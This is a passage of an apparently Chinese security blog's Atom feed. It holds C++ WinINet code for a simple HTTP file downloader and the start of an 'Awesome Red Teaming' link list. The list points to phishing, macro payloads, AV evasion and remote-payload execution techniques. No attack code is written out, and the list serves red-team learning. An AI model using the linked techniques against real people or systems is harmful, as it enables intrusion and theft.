<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>信息安全初学者</title>
  
  <subtitle>No pains No gains！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yaalonsong.github.io/"/>
  <updated>2019-02-28T13:17:19.193Z</updated>
  <id>https://yaalonsong.github.io/</id>
  
  <author>
    <name>yaron</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>wininet_downloader_cpp</title>
    <link href="https://yaalonsong.github.io/2019/02/28/wininet_downloader_cpp.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/wininet_downloader_cpp.html</id>
    <published>2019-02-28T09:49:30.396Z</published>
    <updated>2019-02-28T13:17:19.193Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>wininet.lib  cpp 下载</p></blockquote><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"wininet.lib"</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  DOWNHELPER_AGENTNAME         <span class="meta-string">"downloader"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LEN_OF_BUFFER_FOR_QUERYINFO  128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  DOWNLOAD_BUF_SIZE            (10*1024)  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_DOWNLOAD_REQUEST_TIME    10  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_DOWNLOAD_BYTESIZE        (10000*1024*1024)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">BOOL _TryHttpSendRequest(LPVOID hRequest, <span class="keyword">int</span> nMaxTryTimes); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DownloadUrl</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> strUrl, <span class="built_in">std</span>::<span class="built_in">string</span> strFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (strUrl == <span class="string">""</span> || strFileName == <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"> </span><br><span class="line">   </span><br><span class="line">    HINTERNET hInet = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hConnect = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hRequestHead = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hRequestGet = <span class="literal">NULL</span>; </span><br><span class="line">    HANDLE hFileWrite = <span class="literal">NULL</span>; </span><br><span class="line">    <span class="keyword">char</span>* pBuf = <span class="literal">NULL</span>; </span><br><span class="line">    DWORD dwRequestTryTimes = MAX_DOWNLOAD_REQUEST_TIME;</span><br><span class="line">    DWORD dwDownBytes = <span class="number">0</span>; </span><br><span class="line">    DWORD dwDownFileTotalBytes = <span class="number">0</span>; </span><br><span class="line">    DWORD dwWriteBytes = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">char</span> bufQueryInfo[LEN_OF_BUFFER_FOR_QUERYINFO] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">    DWORD dwBufQueryInfoSize = <span class="keyword">sizeof</span>(bufQueryInfo);</span><br><span class="line">    DWORD dwStatusCode = <span class="number">0</span>;</span><br><span class="line">    DWORD dwContentLen = <span class="number">0</span>;</span><br><span class="line">    DWORD dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    CHAR pszHostName[INTERNET_MAX_HOST_NAME_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszUserName[INTERNET_MAX_USER_NAME_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszPassword[INTERNET_MAX_PASSWORD_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszURLPath[INTERNET_MAX_URL_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR szURL[INTERNET_MAX_URL_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    URL_COMPONENTSA urlComponents = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    urlComponents.dwStructSize = <span class="keyword">sizeof</span>(URL_COMPONENTSA);</span><br><span class="line">    urlComponents.lpszHostName = pszHostName;</span><br><span class="line">    urlComponents.dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH;</span><br><span class="line">    urlComponents.lpszUserName = pszUserName;</span><br><span class="line">    urlComponents.dwUserNameLength = INTERNET_MAX_USER_NAME_LENGTH;</span><br><span class="line">    urlComponents.lpszPassword = pszPassword;</span><br><span class="line">    urlComponents.dwPasswordLength = INTERNET_MAX_PASSWORD_LENGTH;</span><br><span class="line">    urlComponents.lpszUrlPath = pszURLPath;</span><br><span class="line">    urlComponents.dwUrlPathLength = INTERNET_MAX_URL_LENGTH;</span><br><span class="line"> </span><br><span class="line">    bRet = InternetCrackUrlA(strUrl.c_str(), <span class="number">0</span>, <span class="literal">NULL</span>, &amp;urlComponents);</span><br><span class="line">    bRet = (bRet &amp;&amp; urlComponents.nScheme == INTERNET_SERVICE_HTTP);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    hInet = InternetOpenA(DOWNHELPER_AGENTNAME, INTERNET_OPEN_TYPE_PRECONFIG, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hInet)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    hConnect = InternetConnectA(hInet, pszHostName, urlComponents.nPort, pszUserName, pszPassword, INTERNET_SERVICE_HTTP, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (urlComponents.dwUrlPathLength !=  <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(szURL, urlComponents.lpszUrlPath);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strcpy</span>(szURL, <span class="string">"/"</span>);</span><br><span class="line">    </span><br><span class="line">    hRequestHead = HttpOpenRequestA(hConnect, <span class="string">"HEAD"</span>, szURL, <span class="string">"HTTP/1.1"</span>, <span class="string">""</span>, <span class="literal">NULL</span>, INTERNET_FLAG_RELOAD, <span class="number">0</span>);</span><br><span class="line">    bRet = _TryHttpSendRequest(hRequestHead, dwRequestTryTimes);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL; </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    dwContentLen = <span class="number">0</span>;</span><br><span class="line">    dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">    bRet = HttpQueryInfo(hRequestHead, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH, &amp;dwContentLen, &amp;dwSizeDW, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (dwContentLen &gt; MAX_DOWNLOAD_BYTESIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    hRequestGet = HttpOpenRequestA(hConnect, <span class="string">"GET"</span>, szURL, <span class="string">"HTTP/1.1"</span>, <span class="string">""</span>, <span class="literal">NULL</span>, INTERNET_FLAG_RELOAD, <span class="number">0</span>);</span><br><span class="line">    bRet = _TryHttpSendRequest(hRequestGet, dwRequestTryTimes);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL; </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    hFileWrite = CreateFileA(strFileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFileWrite)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    pBuf = <span class="keyword">new</span> <span class="keyword">char</span>[DOWNLOAD_BUF_SIZE]; </span><br><span class="line">    <span class="keyword">if</span> (!pBuf)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    dwDownFileTotalBytes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwDownBytes = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(pBuf, <span class="number">0</span>, DOWNLOAD_BUF_SIZE*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        bRet = InternetReadFile(hRequestGet, pBuf, DOWNLOAD_BUF_SIZE, &amp;dwDownBytes);</span><br><span class="line">        <span class="keyword">if</span> (bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (dwDownBytes &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwDownFileTotalBytes += dwDownBytes;</span><br><span class="line">                bRet = WriteFile(hFileWrite, pBuf, dwDownBytes, &amp;dwWriteBytes, <span class="literal">NULL</span>); </span><br><span class="line">                <span class="keyword">if</span> (!bRet)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == dwDownBytes)</span><br><span class="line">            &#123;</span><br><span class="line">                bRet = TRUE;</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">_END_OF_DOWNLOADURL:</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE != hFileWrite)</span><br><span class="line">        CloseHandle(hFileWrite);</span><br><span class="line">    <span class="keyword">if</span> (pBuf)</span><br><span class="line">        <span class="keyword">delete</span> [] pBuf;</span><br><span class="line">    <span class="keyword">if</span> (hRequestGet)</span><br><span class="line">        InternetCloseHandle(hRequestGet);</span><br><span class="line">    <span class="keyword">if</span> (hRequestHead)</span><br><span class="line">        InternetCloseHandle(hRequestHead);</span><br><span class="line">    <span class="keyword">if</span> (hConnect)</span><br><span class="line">        InternetCloseHandle(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hInet)</span><br><span class="line">        InternetCloseHandle(hInet);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">BOOL _TryHttpSendRequest(LPVOID hRequest, <span class="keyword">int</span> nMaxTryTimes)</span><br><span class="line">&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    DWORD dwStatusCode = <span class="number">0</span>;</span><br><span class="line">    DWORD dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">    <span class="keyword">while</span> (hRequest &amp;&amp; (nMaxTryTimes-- &gt; <span class="number">0</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line">        bRet = HttpSendRequestA(hRequest, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            dwStatusCode = <span class="number">0</span>;</span><br><span class="line">            dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">            bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &amp;dwStatusCode, &amp;dwSizeDW, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (bRet)</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (HTTP_STATUS_OK == dwStatusCode) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    bRet = FALSE;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">"pls input downloadurl:"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">cin</span>.get(str,<span class="number">80</span>);</span><br><span class="line">    </span><br><span class="line">BOOL bR = DownloadUrl(str, <span class="string">"temp.png"</span>); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Downloading..."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (bR)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"no"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;wininet.lib  cpp 下载&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="code" scheme="https://yaalonsong.github.io/categories/code/"/>
    
    
      <category term="code" scheme="https://yaalonsong.github.io/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>Red Teaming Tools</title>
    <link href="https://yaalonsong.github.io/2019/02/28/Awesome%20Red%20Teaming.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/Awesome Red Teaming.html</id>
    <published>2019-02-28T09:49:30.380Z</published>
    <updated>2019-02-28T14:19:42.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Awesome-Red-Teaming"><a href="#Awesome-Red-Teaming" class="headerlink" title="Awesome Red Teaming"></a>Awesome Red Teaming</h1><p>List of Awesome Red Team / Red Teaming Resources</p><p>This list is for anyone wishing to learn about Red Teaming but do not have a starting point.</p><p>Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on <a href="https://attack.mitre.org/wiki/Main_Page" target="_blank" rel="noopener">Mitre ATT&amp;CK</a></p><p>You can help by sending Pull Requests to add more information.</p><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul><li><a href="#-initial-access">Initial Access</a></li><li><a href="#-execution">Execution</a></li><li><a href="#-persistence">Persistence</a></li><li><a href="#-privilege-escalation">Privilege Escalation</a></li><li><a href="#-defense-evasion">Defense Evasion</a></li><li><a href="#-credential-access">Credential Access</a></li><li><a href="#-discovery">Discovery</a></li><li><a href="#-lateral-movement">Lateral Movement</a></li><li><a href="#-collection">Collection</a></li><li><a href="#-exfiltration">Exfiltration</a></li><li><a href="#-command-and-control">Command and Control</a></li><li><a href="#-embedded-and-peripheral-devices-hacking">Embedded and Peripheral Devices Hacking</a></li><li><a href="#-misc">Misc</a></li><li><a href="#-redteam-gadgets">RedTeam Gadgets</a></li><li><a href="#-ebooks">Ebooks</a></li><li><a href="#-training--free-">Training</a></li><li><a href="#-certification">Certification</a></li></ul><h2 id="↑-Initial-Access"><a href="#↑-Initial-Access" class="headerlink" title="↑ Initial Access"></a><a href="#table-of-contents">↑</a> Initial Access</h2><ul><li><a href="https://www.blackhillsinfosec.com/empires-cross-platform-office-macro/" target="_blank" rel="noopener">How To: Empire’s Cross Platform Office Macro</a></li><li><a href="https://www.blackhillsinfosec.com/phishing-with-powerpoint/" target="_blank" rel="noopener">Phishing with PowerPoint</a></li><li><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/" target="_blank" rel="noopener">PHISHING WITH EMPIRE</a></li><li><a href="https://hakshop.com/products/bash-bunny" target="_blank" rel="noopener">Bash Bunny</a></li><li><a href="https://www.owasp.org/images/5/54/Presentation_Social_Engineering.pdf" target="_blank" rel="noopener">OWASP Presentation of Social Engineering - OWASP</a></li><li><a href="https://www.redteamsecure.com/usb-drop-attacks-the-danger-of-lost-and-found-thumb-drives/" target="_blank" rel="noopener">USB Drop Attacks: The Danger of “Lost And Found” Thumb Drives</a></li><li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Seymour-Tully-Weaponizing-Data-Science-For-Social-Engineering-WP.pdf" target="_blank" rel="noopener">Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 23</a></li><li><a href="https://www.cobaltstrike.com/help-spear-phish" target="_blank" rel="noopener">Cobalt Strike - Spear Phishing documentation</a></li><li><a href="https://blog.cobaltstrike.com/2014/12/17/whats-the-go-to-phishing-technique-or-exploit/" target="_blank" rel="noopener">Cobalt Strike Blog - What’s the go-to phishing technique or exploit?</a></li><li><a href="https://www.youtube.com/watch?v=V7UJjVcq2Ao" target="_blank" rel="noopener">Spear phishing with Cobalt Strike - Raphael Mudge</a></li><li><a href="https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/" target="_blank" rel="noopener">EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE</a></li><li><a href="http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/" target="_blank" rel="noopener">Phishing for access</a></li><li><a href="https://4sysops.com/archives/excel-macros-with-powershell/" target="_blank" rel="noopener">Excel macros with PowerShell</a></li><li><a href="https://phishme.com/powerpoint-and-custom-actions/" target="_blank" rel="noopener">PowerPoint and Custom Actions</a></li><li><a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/" target="_blank" rel="noopener">Macro-less Code Exec in MSWord</a></li><li><a href="https://medium.com/@malcomvetter/multi-platform-macro-phishing-payloads-3b688e8eff68" target="_blank" rel="noopener">Multi-Platform Macro Phishing Payloads</a></li><li><a href="https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/" target="_blank" rel="noopener">Abusing Microsoft Word Features for Phishing: “subDoc”</a></li><li><a href="https://enigma0x3.net/2017/07/13/phishing-against-protected-view/" target="_blank" rel="noopener">Phishing Against Protected View</a></li><li><a href="https://fzuckerman.wordpress.com/2016/10/06/powershell-empire-stagers-1-phishing-with-an-office-macro-and-evading-avs/" target="_blank" rel="noopener">POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS</a></li><li><a href="https://www.redteamsecure.com/the-plugbot-hardware-botnet-research-project/" target="_blank" rel="noopener">The PlugBot: Hardware Botnet Research Project</a></li><li><a href="https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator" target="_blank" rel="noopener">Luckystrike: An Evil Office Document Generator</a></li><li><a href="http://georgemauer.net/2017/10/07/csv-injection.html" target="_blank" rel="noopener">The Absurdly Underestimated Dangers of CSV Injection</a></li><li><a href="https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/amp/" target="_blank" rel="noopener">Macroless DOC malware that avoids detection with Yara rule</a></li><li><a href="https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279" target="_blank" rel="noopener">Phishing between the app whitelists</a></li><li><a href="https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/" target="_blank" rel="noopener">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2)</a></li><li><a href="https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/" target="_blank" rel="noopener">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2)</a></li><li><a href="https://www.social-engineer.org/" target="_blank" rel="noopener">Social Engineer Portal</a></li><li><a href="http://www.darkreading.com/the-7-best-social-engineering-attacks-ever/d/d-id/1319411" target="_blank" rel="noopener">7 Best social Engineering attack</a></li><li><a href="https://www.rsaconference.com/writable/presentations/file_upload/das-301_williams_rader.pdf" target="_blank" rel="noopener">Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012</a></li><li><a href="https://1337red.wordpress.com/using-the-dde-attack-with-powershell-empire/" target="_blank" rel="noopener">USING THE DDE ATTACK WITH POWERSHELL EMPIRE</a></li><li><a href="https://www.kitploit.com/2018/02/pot-phishing-on-twitter.html" target="_blank" rel="noopener">Phishing on Twitter - POT</a></li><li><a href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/" target="_blank" rel="noopener">Microsoft Office – NTLM Hashes via Frameset</a></li><li><a href="https://oddvar.moe/2017/09/13/defense-in-depth-writeup/" target="_blank" rel="noopener">Defense-In-Depth write-up</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/05/07/Phishing.html" target="_blank" rel="noopener">Spear Phishing 101</a></li></ul><h2 id="↑-Execution"><a href="#↑-Execution" class="headerlink" title="↑ Execution"></a><a href="#table-of-contents">↑</a> Execution</h2><ul><li><a href="https://msitpros.com/?p=3960" target="_blank" rel="noopener">Research on CMSTP.exe,</a></li><li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/" target="_blank" rel="noopener">Windows oneliners to download remote payload and execute arbitrary code</a></li><li><a href="https://bohops.com/2017/12/02/clickonce-twice-or-thrice-a-technique-for-social-engineering-and-untrusted-command-execution/" target="_blank" rel="noopener">Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts</a></li><li><a href="https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd" target="_blank" rel="noopener">WSH Injection: A Case Study</a></li><li><a href="http://lockboxx.blogspot.com/2018/02/intro-to-using-gscript-for-red-teams.html" target="_blank" 